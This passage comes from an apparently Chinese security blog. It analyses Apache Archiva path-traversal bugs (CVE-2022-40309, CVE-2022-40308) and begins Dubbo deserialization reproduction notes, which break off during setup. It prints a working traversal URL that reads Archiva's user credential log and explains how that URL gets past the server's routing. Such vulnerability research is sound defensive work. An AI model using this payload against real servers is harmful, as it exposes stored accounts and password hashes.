<p>org.apache.archiva.rest.services.DefaultRepositoriesService#deleteProject</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Boolean <span class="title function_">deleteProject</span><span class="params">( String groupId, String projectId, String repositoryId )</span></span><br><span class="line">    <span class="keyword">throws</span> ArchivaRestServiceException</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">if</span> ( !isAuthorizedToDeleteArtifacts( repositoryId ) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ArchivaRestServiceException</span>( <span class="string">&quot;not authorized to delete artifacts&quot;</span>, <span class="number">403</span>, <span class="literal">null</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ManagedRepositoryContent</span> <span class="variable">repository</span> <span class="operator">=</span> repositoryFactory.getManagedRepositoryContent( repositoryId );</span><br><span class="line"></span><br><span class="line">        repository.deleteProject( groupId, projectId );</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>isAuthorizedToDeleteArtifacts</code> 限制登录用户需要有<code>archiva-delete-artifact</code>权限</p>
<p>在<code>repository.deleteProject( groupId, projectId )</code>中直接拼接了目录名进行删除</p>
<p>org.apache.archiva.repository.content.maven2.ManagedDefaultRepositoryContent#deleteProject</p>
<p><img src="/Apache-Archiva-%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E5%88%A0%E9%99%A4-CVE-2022-40309-%E5%92%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-CVE-2022-40308/image-20221224122331434.png" alt="image-20221224122331434"></p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/apache/archiva/commit/930460424c715f52a7cb5eef5b084a7a8ef31fb5#diff-bde5305e671d2bdf9f05df227a6fa706f87b911c28799575537f806a063a9134R95">https://github.com/apache/archiva/commit/930460424c715f52a7cb5eef5b084a7a8ef31fb5#diff-bde5305e671d2bdf9f05df227a6fa706f87b911c28799575537f806a063a9134R95</a></p>
<p><img src="/Apache-Archiva-%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E5%88%A0%E9%99%A4-CVE-2022-40309-%E5%92%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-CVE-2022-40308/image-20221224122618527.png" alt="image-20221224122618527"></p>
<h2 id="CVE-2022-40308"><a href="#CVE-2022-40308" class="headerlink" title="CVE-2022-40308"></a>CVE-2022-40308</h2><h3 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h3><ul>
<li>Apache Archiva &lt; 2.2.9</li>
</ul>
<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>同上</p>
<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>前置条件是启用匿名读取或者使用拥有<code>archiva-read-repository</code>权限的用户</p>
<p>在如下界面点击下载然后抓包</p>
<p><img src="/Apache-Archiva-%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E5%88%A0%E9%99%A4-CVE-2022-40309-%E5%92%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-CVE-2022-40308/image-20221224144645880.png" alt="image-20221224144645880"></p>
<p>修改URL为<code>/repository/internal/..//../data/databases/users/log/log1.dat</code>，这将会读取Archiva根目录下的<code>data/databases/users/log/log1.dat</code>文件，该文件会记录系统用户账号及加密后的密码</p>
<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>由web.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>RepositoryServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/repository/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>入口在RepositoryServlet，而且POC<code>/repository/internal/..///../data/databases/users/log/log1.dat</code>中的<code>..///..</code>必须是两个及以上数量的<code>/</code>，如果URL为<code>/repository/internal/../../data/databases/users/log/log1.dat</code>，则Jetty会认为请求的是<code>/data/databases/users/log/log1.dat</code>而非<code>/repository/*</code></p>
<p>org.apache.archiva.webdav.RepositoryServlet#service</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">( HttpServletRequest request, HttpServletResponse response )</span></span><br><span class="line">    <span class="keyword">throws</span> ServletException, IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">WebdavRequest</span> <span class="variable">webdavRequest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebdavRequestImpl</span>( request, getLocatorFactory() );</span><br><span class="line">    <span class="comment">// DeltaV requires &#x27;Cache-Control&#x27; header for all methods except &#x27;VERSION-CONTROL&#x27; and &#x27;REPORT&#x27;.</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">methodCode</span> <span class="operator">=</span> DavMethods.getMethodCode( request.getMethod() );</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">noCache</span> <span class="operator">=</span> DavMethods.isDeltaVMethod( webdavRequest ) &amp;&amp; !( DavMethods.DAV_VERSION_CONTROL == methodCode</span><br><span class="line">        || DavMethods.DAV_REPORT == methodCode );</span><br><span class="line">    <span class="type">WebdavResponse</span> <span class="variable">webdavResponse</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebdavResponseImpl</span>( response, noCache );</span><br><span class="line">    <span class="type">DavResource</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// make sure there is a authenticated user</span></span><br><span class="line">        <span class="keyword">if</span> ( !getDavSessionProvider().attachSession( webdavRequest ) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// check matching if=header for lock-token relevant operations</span></span><br><span class="line">        resource =</span><br><span class="line">            getResourceFactory().createResource( webdavRequest.getRequestLocator(), webdavRequest, webdavResponse );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( !isPreconditionValid( webdavRequest, resource ) )</span><br><span class="line">        &#123;</span><br><span class="line">            webdavResponse.sendError( DavServletResponse.SC_PRECONDITION_FAILED );</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( !execute( webdavRequest, webdavResponse, methodCode, resource ) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">super</span>.service( request, response );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟入<code>getResourceFactory().createResource</code></p>
<p>org.apache.archiva.webdav.ArchivaDavResourceFactory#createResource(org.apache.jackrabbit.webdav.DavResourceLocator, org.apache.jackrabbit.webdav.DavServletRequest, org.apache.jackrabbit.webdav.DavServletResponse)</p>
<p><img src="/Apache-Archiva-%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E5%88%A0%E9%99%A4-CVE-2022-40309-%E5%92%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-CVE-2022-40308/image-20221224150817035.png" alt="image-20221224150817035"></p>
<p>鉴权在<code>processRepository(...)</code>中，过了鉴权后发现其实问题也是由于未验证文件名，这里将包含目录穿越的路径直接拼接到<code>new File()</code>参数中</p>
<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>这是当时给官方提交漏洞后，官方回复的修复方式，和目前最新版的代码好像不太一样</p>
<p><a href="https://github.com/apache/archiva/commit/4a2d43be63634331668d71590034963e96a8886a#diff-7828cc4ef12a5f453debc98ef5c3eaf85c6851b271ee298a75b4bd6ea001846cR605">https://github.com/apache/archiva/commit/4a2d43be63634331668d71590034963e96a8886a#diff-7828cc4ef12a5f453debc98ef5c3eaf85c6851b271ee298a75b4bd6ea001846cR605</a></p>
<p><img src="/Apache-Archiva-%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E5%88%A0%E9%99%A4-CVE-2022-40309-%E5%92%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-CVE-2022-40308/image-20221224152543702.png" alt="image-20221224152543702"></p>
<p>当时的修复方式和CVE-2022-40309的修复差不多</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://lists.apache.org/thread/1odl4p85r96n27k577jk6ftrp19xfc27">https://lists.apache.org/thread/1odl4p85r96n27k577jk6ftrp19xfc27</a></p>
<p><a href="https://lists.apache.org/thread/x01pnn0jjsw512cscxsbxzrjmz64n4cc">https://lists.apache.org/thread/x01pnn0jjsw512cscxsbxzrjmz64n4cc</a></p>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
        <tag>Apache Archiva</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Dubbo 反序列化漏洞复现笔记</title>
    <url>/2020/08/25/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>Apache Dubbo支持多种协议，官方推荐使用 Dubbo 协议，CVE-2019-17564是属于Apache Dubbo HTTP协议中的一个反序列化漏洞，当Apache Dubbo启用HTTP协议之后，Apache Dubbo在接受来自消费者的远程调用请求的时候存在一个不安全的反序列化。</p>
<p>CVE-2020-1948是当Dubbo服务端暴露时(默认端口：20880)，攻击者可以发送任意的服务名或方法名的RPC请求，同时附加恶意的序列化参数，服务端在解析参数进行反序列化时触发。</p>
<span id="more"></span>

<h2 id="Apache-Dubbo"><a href="#Apache-Dubbo" class="headerlink" title="Apache Dubbo"></a>Apache Dubbo</h2><p>Apache Dubbo 是一款高性能、轻量级的开源Java RPC框架，它提供了三大核心能力：面向接口的远程方法调用，智能容错和负载均衡，以及服务自动注册和发现。</p>
<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200702110855684.png" alt="image-20200702110855684"></p>
<p>使用Dubbo的最常见方法是在Spring框架中运行</p>
<p>IDEA中创建一个maven空项目，作为项目父工程，然后右键父工程目录依次创建三个Module provider,consumer和api，项目结构如下</p>
<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200804113826277.png" alt="image-20200804113826277"></p>
<p>父工程的pom文件中应该会自动设置modules</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">modules</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">module</span>&gt;</span>provider<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">module</span>&gt;</span>consumer<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">module</span>&gt;</span>api<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">modules</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>子工程中则会设置parent</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>DubboDemo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>父工程pom中加入Spring及Dubbo依赖，Dubbo中包含Spring，为避免冲突需要排除</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.7.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.7.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.7.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.dubbo<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dubbo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.curator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>curator-framework<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.curator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>curator-recipes<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-simple<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>在api子工程中定义接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">DemoService</span> &#123;</span><br><span class="line">    String <span class="title function_">sayHello</span><span class="params">(String name)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在provider子工程中实现接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">DemoService</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（provider子工程中的pom文件需要将api子工程设为依赖才能使用其中的类）</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后在resources目录创建provider.xml，其中注释了multicast registry center，使用zookeeper作为Registry，协议<code>dubbo:protocol</code>是用的dubbo协议，下文CVE-2019-17564中的漏洞条件是需要使用http协议的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;beans xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">       xmlns:dubbo=<span class="string">&quot;http://code.alibabatech.com/schema/dubbo&quot;</span></span><br><span class="line">       xmlns=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="line">       xsi:schemaLocation=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.3.xsd</span></span><br><span class="line"><span class="string">       http://code.alibabatech.com/schema/dubbo  http://code.alibabatech.com/schema/dubbo/dubbo.xsd&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- provider<span class="string">&#x27;s application name, used for tracing dependency relationship --&gt;</span></span><br><span class="line"><span class="string">    &lt;dubbo:application name=&quot;demo-provider&quot;/&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;!-- use multicast registry center to export service --&gt;</span></span><br><span class="line"><span class="string">    &lt;!--&lt;dubbo:registry address=&quot;multicast://224.5.6.7:1234&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;!-- 使用zookeeper注册中心暴露服务地址 --&gt;</span></span><br><span class="line"><span class="string">    &lt;dubbo:registry address=&quot;zookeeper://127.0.0.1:2181&quot; /&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;!-- use dubbo protocol to export service on port 20880 --&gt;</span></span><br><span class="line"><span class="string">    &lt;dubbo:protocol name=&quot;dubbo&quot; port=&quot;20880&quot;/&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;!-- service implementation, as same as regular local bean --&gt;</span></span><br><span class="line"><span class="string">    &lt;bean id=&quot;demoService&quot; class=&quot;DemoServiceImpl&quot;/&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;!-- declare the service interface to be exported --&gt;</span></span><br><span class="line"><span class="string">    &lt;dubbo:service interface=&quot;DemoService&quot; ref=&quot;demoService&quot;/&gt;</span></span><br><span class="line"><span class="string">&lt;/beans&gt;</span></span><br></pre></td></tr></table></figure>

<p>创建Provider类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Provider</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ClassPathXmlApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;classpath:provider.xml&quot;</span>&#125;);</span><br><span class="line">        context.start();</span><br><span class="line">        System.out.println(<span class="string">&quot;Provider started.&quot;</span>);</span><br><span class="line">        System.in.read(); <span class="comment">// press any key to exit</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>consumer子工程中创建Consumer类，同样pom文件中需要设置api子工程为依赖才能使用其中的类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Consumer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPathXmlApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;classpath:consumer.xml&quot;</span>&#125;);</span><br><span class="line">        context.start();</span><br><span class="line">        <span class="comment">// Obtaining a remote service proxy</span></span><br><span class="line">        <span class="type">DemoService</span> <span class="variable">demoService</span> <span class="operator">=</span> (DemoService)context.getBean(<span class="string">&quot;demoService&quot;</span>);</span><br><span class="line">        <span class="comment">// Executing remote methods</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">hello</span> <span class="operator">=</span> demoService.sayHello(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">        <span class="comment">// Display the call result</span></span><br><span class="line">        System.out.println(hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在resources创建consumer.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:dubbo</span>=<span class="string">&quot;http://code.alibabatech.com/schema/dubbo&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.3.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://code.alibabatech.com/schema/dubbo http://code.alibabatech.com/schema/dubbo/dubbo.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- consumer&#x27;s application name, used for tracing dependency relationship (not a matching criterion),</span></span><br><span class="line"><span class="comment">    don&#x27;t set it same as provider --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:application</span> <span class="attr">name</span>=<span class="string">&quot;demo-consumer&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- use multicast registry center to discover service --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;dubbo:registry address=&quot;multicast://224.5.6.7:1234&quot;/&gt; --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 使用zookeeper注册中心暴露服务地址 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:registry</span> <span class="attr">address</span>=<span class="string">&quot;zookeeper://127.0.0.1:2181&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- generate proxy for the remote service, then demoService can be used in the same way as the</span></span><br><span class="line"><span class="comment">    local regular interface --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:reference</span> <span class="attr">id</span>=<span class="string">&quot;demoService&quot;</span> <span class="attr">check</span>=<span class="string">&quot;false&quot;</span> <span class="attr">interface</span>=<span class="string">&quot;DemoService&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>Zookeeper可作为Dubbo的Registry，Dubbo服务的provider和consumer都需要在Zookeeper进行注册，下载Zookeeper并解压，将conf目录下的zoo_sample.cfg改名为 zoo.cfg，bin目录下运行zkServer启动Zookeeper，zoo_sample.cfg默认服务端口2181</p>
<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200804114838414.png" alt="image-20200804114838414"></p>
<p>依次运行provider和consumer，输出Hello world即完成了一次RPC</p>
<p><img src="/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20200804115529302.png" alt="image-20200804115529302"></p>
<h2 id="CVE-2019-17564"><a href="#CVE-2019-17564" class="headerlink" title="CVE-2019-17564"></a>CVE-2019-17564</h2><p>This vulnerability can affect users using Dubbo-Rpc-Http (2.7.3 or lower) and Spring-Web (5.1.9.RELEASE or lower).</p>
<p>Notice that this vulnerability only affects users who enable http protocol provided by Dubbo:<code>&lt;dubbo:protocol name=&quot;http&quot;/&gt;</code></p>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
<li>Dubbo 2.7.0 to 2.7.4</li>
<li>Dubbo 2.6.0 to 2.6.7</li>
<li>Dubbo all 2.5.x versions</li>
</ul>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><a href="https://github.com/apache/dubbo-samples/tree/master/java/dubbo-samples-http">https://github.com/apache/dubbo-samples/tree/master/java/dubbo-samples-http</a></p>
<p>pom中设置Dubbo的版本为漏洞版本2.7.3并放入反序列化的Gadget</p>
